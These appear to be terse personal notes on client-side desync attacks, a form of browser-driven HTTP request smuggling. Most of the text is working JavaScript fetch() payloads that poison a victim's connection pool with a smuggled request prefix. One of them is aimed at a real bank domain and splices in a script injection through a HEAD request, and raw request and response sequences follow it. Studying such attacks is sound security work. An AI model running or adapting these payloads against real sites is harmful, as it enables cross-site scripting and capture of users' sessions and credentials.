
if an endpoint is taken by surprise that its not expecting a Content-Length leads to not reading the body, got appended to the next connection request from the victim browser.

```js
fetch('https://example.com/b/', {  
 method: 'POST',  
 body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix  
 mode: 'no-cors', // ensure connection ID is visible  
 credentials: 'include' // poison 'with-cookies' pool  
}).then(() => {  
 location = 'https://example.com/' // use the poisoned connection  
})
```


- we can exploit this by storing the credentials in any like posting a comment/blog based on the site functionality.
- javascript resource poisoning via host header redirect similar to request tunneling
- head method to splice the response and execute the javascript
  
```js
fetch('https://www.capitalone.ca/assets', {  
    method: 'POST',  
  
    // use a cache-buster to delay the response  
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,  
    credentials: 'include',  
    mode: 'cors' // throw an error instead of following redirect  
}).catch(() => {  
    location = 'https://www.capitalone.ca/'  
})
```

- request sequence

```http
POST /assets HTTP/1.1  
Host: www.capitalone.ca  
Content-Length: 67  
  
HEAD /404/?cb=123 HTTP/1.1  
  
GET /x?<script>evil() HTTP/1.1  
X: Y

----- request 2 ----

GET / HTTP/1.1  
Host: www.capitalone.ca
```

- response sequence

```http
HTTP/1.1 301 Moved Permanently  
Location: /assets/

---- response ----

HTTP/1.1 404 Not Found  
Content-Type: text/html  
Content-Length: 432837  
  
HTTP/1.1 301 Moved Permanently  
Location: /x/?<script>evil()
```